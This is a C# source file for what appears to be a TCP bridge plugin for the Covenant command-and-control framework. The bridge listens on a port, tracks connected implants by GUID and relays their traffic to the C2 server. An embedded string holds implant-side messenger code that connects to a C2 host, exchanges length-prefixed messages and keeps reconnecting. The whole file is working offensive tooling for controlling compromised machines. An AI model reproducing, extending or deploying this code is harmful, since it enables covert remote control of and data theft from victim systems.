using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Concurrent;

namespace C2Bridge
{
    public class TcpC2Bridge : C2Bridge
    {
        private int ExternalPort { get; }
        private readonly ConcurrentDictionary<string, TcpClient> Clients = new ConcurrentDictionary<string, TcpClient>();

        public TcpC2Bridge(BridgeConnector connector, BridgeProfile profile, string[] args) : base(connector, profile)
        {
            if (args.Length != 1 || !int.TryParse(args[0], out int ExternalPort))
            {
                Console.Error.Write("Usage: TCPC2Bridge <bridge_connector_args> <external_tcp_port>");
                Environment.Exit(1); return;
            }
            this.ExternalPort = ExternalPort;
        }

        public override async Task RunAsync(CancellationToken token)
        {
            this.BridgeConnector.OnReadBridge += (sender, e) =>
            {
                ProfileData parsed = this.BridgeProfile.ParseRead(e.Read);
                if (parsed != null)
                {
                    TcpClient client = Clients[parsed.Guid];
                    _ = this.Write(client.GetStream(), e.Read);
                }
            };
            TcpListener Listener = new TcpListener(IPAddress.Any, this.ExternalPort);
            Listener.Start();

            while (!token.IsCancellationRequested)
            {
                TcpClient client = await Listener.AcceptTcpClientAsync();
                client.ReceiveTimeout = client.SendTimeout = 0;
                _ = ReadClientAsync(client, token);
            }
        }

        protected override async Task<string> Read(dynamic readobj)
        {
            return await Utilities.ReadStreamAsync((Stream)readobj);
        }

        protected override async Task Write(dynamic readobj, string data)
        {
            await Utilities.WriteStreamAsync((Stream)readobj, data);
        }

        private async Task ReadClientAsync(TcpClient client, CancellationToken token)
        {
            NetworkStream stream = client.GetStream();
            stream.ReadTimeout = stream.WriteTimeout = Timeout.Infinite;
            string guid = null;
            while (!token.IsCancellationRequested)
            {
                try
                {
                    string data = await this.Read(stream);
                    ProfileData parsed = this.BridgeProfile.ParseWrite(data);
                    if (parsed != null)
                    {
                        if (guid == null)
                        {
                            guid = parsed.Guid;
                            if (!Clients.ContainsKey(parsed.Guid))
                            {
                                Clients.TryAdd(parsed.Guid, client);
                            }
                        }
                        string bridgeData = this.BridgeProfile.FormatRead(new ProfileData { Guid = parsed.Guid, Data = parsed.Data });
                        _ = this.BridgeConnector.Write(bridgeData);
                    }
                }
                catch
                {
                    Clients.TryRemove(guid, out client);
                    client.Dispose();
                }
            }
        }

        protected override string GetBridgeMessengerCode()
        {
            return this.BridgeMessengerCode;
        }

        private string BridgeMessengerCode { get; } =
@"public interface IMessenger
{
    string Hostname { get; }
    string Identifier { get; set; }
    string Authenticator { get; set; }
    string Read();
    void Write(string Message);
    void Close();
}

public class BridgeMessenger : IMessenger
{
    public string Hostname { get; } = """";
    private int Port { get; }
    public string Identifier { get; set; } = """";
    public string Authenticator { get; set; } = """";

    private string CovenantURI { get; }
    private object _tcpLock = new object();
    private string WriteFormat { get; set; }
    public TcpClient client { get; set; }
    public Stream stream { get; set; }

    public BridgeMessenger(string CovenantURI, string Identifier, string WriteFormat)
    {
        this.CovenantURI = CovenantURI;
        this.Identifier = Identifier;
        this.Hostname = CovenantURI.Split(':')[0];
        this.Port = int.Parse(CovenantURI.Split(':')[1]);
        this.WriteFormat = WriteFormat;
    }

    public string Read()
    {
        byte[] read = this.ReadBytes();
        if (read == null)
        {
            Thread.Sleep(5000);
            this.Close();
            this.Connect();
            return """";
        }
        return Encoding.UTF8.GetString(read);
    }

    public void Write(string Message)
    {
        try
        {
            lock (_tcpLock)
            {
                this.WriteBytes(Encoding.UTF8.GetBytes(Message));
                return;
            }
        }
        catch
        {
            Thread.Sleep(5000);
            this.Close();
            this.Connect();
        }
    }

    public void Close()
    {
        this.stream.Close();
        this.client.Close();
    }

    public void Connect()
    {
        try
        {
            this.client = new TcpClient();
            client.Connect(IPAddress.Parse(CovenantURI.Split(':')[0]), int.Parse(CovenantURI.Split(':')[1]));
            client.ReceiveTimeout = 0;
            client.SendTimeout = 0;
            this.stream = client.GetStream();
            this.stream.ReadTimeout = -1;
            this.stream.WriteTimeout = -1;
            this.Write(String.Format(this.WriteFormat, """", this.Identifier));
            Thread.Sleep(1000);
        }
        catch { }
    }

    private void WriteBytes(byte[] bytes)
    {
        byte[] size = new byte[4];
        size[0] = (byte)(bytes.Length >> 24);
        size[1] = (byte)(bytes.Length >> 16);
        size[2] = (byte)(bytes.Length >> 8);
        size[3] = (byte)bytes.Length;
        this.stream.Write(size, 0, size.Length);
        var writtenBytes = 0;
        while (writtenBytes < bytes.Length)
        {
            int bytesToWrite = Math.Min(bytes.Length - writtenBytes, 1024);
            this.stream.Write(bytes, writtenBytes, bytesToWrite);
            writtenBytes += bytesToWrite;
        }
    }

    private byte[] ReadBytes()
    {
        byte[] size = new byte[4];
        int totalReadBytes = 0;
        int readBytes = 0;
        do
        {
            readBytes = this.stream.Read(size, 0, size.Length);
            if (readBytes == 0) { return null; }
            totalReadBytes += readBytes;
        } while (totalReadBytes < size.Length);
        int len = (size[0] << 24) + (size[1] << 16) + (size[2] << 8) + size[3];

        byte[] buffer = new byte[1024];
        using (var ms = new MemoryStream())
        {
            totalReadBytes = 0;
            readBytes = 0;
            do
            {
                readBytes = this.stream.Read(buffer, 0, buffer.Length);
                if (readBytes == 0) { return null; }
                ms.Write(buffer, 0, readBytes);
                totalReadBytes += readBytes;
            } while (totalReadBytes < len);
            return ms.ToArray();
        }
    }
}";
    }
}
